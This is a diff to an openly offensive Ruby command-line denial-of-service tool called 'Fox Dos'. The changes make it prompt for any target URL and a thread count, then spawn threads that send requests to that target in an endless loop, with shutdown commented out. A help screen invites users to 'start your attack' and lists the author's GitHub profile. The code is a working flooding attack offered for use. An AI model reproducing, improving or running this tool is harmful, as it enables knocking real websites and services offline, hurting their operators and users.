@@ -23,39 +23,59 @@ CLI::UI::Frame.open('Fox Dos') do
   selected = nil
   CLI::UI::Prompt::ask('Select one action:') do |handler|
     handler.option('Dos')  { |selection| selected = selection }
-    handler.option('DDos (comming soon)')  { |selection| selected = selection }
+    handler.option('DDos')  { |selection| selected = selection }
+    handler.option('Help')  { |selection| selected = selection }
   end
 
   # Dos attack
-  CLI::UI::Frame.divider("{{v}} #{selected}")
-  if selected == 'Dos'
+  CLI::UI::Frame.divider(selected)
+  case selected
 
+  when 'Dos'
     # Define the target URL
-    url = URI('https://meisam3dfox.blog.ir')
+    begin
+      target = URI CLI::UI.ask('Target URL:', default: 'No Target!')
+    rescue => e
+      puts CLI::UI.fmt "{{red:#{e.message}}}"
+    else
+      # Number of threads to simulate multiple requests
+      num_threads = CLI::UI.ask('Number of threads:', default: '10').to_i
 
-    # Number of threads to simulate multiple requests
-    num_threads = 100
+      # Create a thread pool
+      pool = Concurrent::FixedThreadPool.new(num_threads)
 
-    # Create a thread pool
-    pool = Concurrent::FixedThreadPool.new(num_threads)
-
-    # Submit tasks to the thread pool
-    CLI::UI::Spinner.spin("Sending packets: {{@widget/status:1:2:3:4}}") do |spinner|
-      num_threads.times do
-        pool.post do
-          loop do
-            send_request(url)
-            sleep 0.1 # Adjust the sleep interval as needed
+      # Submit tasks to the thread pool
+      CLI::UI::Spinner.spin("Sending packets to #{target}: {{@widget/status:1:2:3:4}}") do |spinner|
+        num_threads.times do
+          pool.post do
+            loop do
+              send_request(target)
+              sleep 0.1 # Adjust the sleep interval as needed
+            end
           end
         end
       end
+
+      # Shutdown the pool (this will not happen in this case)
+      #pool.shutdown
+      #pool.wait_for_termination
+    end
+  when 'DDos'
+    puts CLI::UI.fmt "{{underline:The DDos mode is not ready.}}"
+  when 'Help'
+
+    CLI::UI::Frame.open('{{i}} About', color: :blue) do
+      puts CLI::UI.fmt "{{green:Description}}"
+      puts "This is a simple Dos and DDos tool made by Meisam Heidari with Ruby language."
+      puts "Just Select one option then you can start your attack!\n\nGithub: https://github.com/Mr-Fox-h"
     end
 
-    # Shutdown the pool (this will not happen in this case)
-    pool.shutdown
-    #pool.wait_for_termination
-  else
-    puts "Not yet"
-  end
+    # Add More data in the help options
 
+    CLI::UI::Frame.open('{{!}} Atention', color: :red) do
+      puts "The DDos mode is not ready!"
+    end
+  else
+    puts CLI::UI.fmt "{{red:Error!}}"
+  end
 end
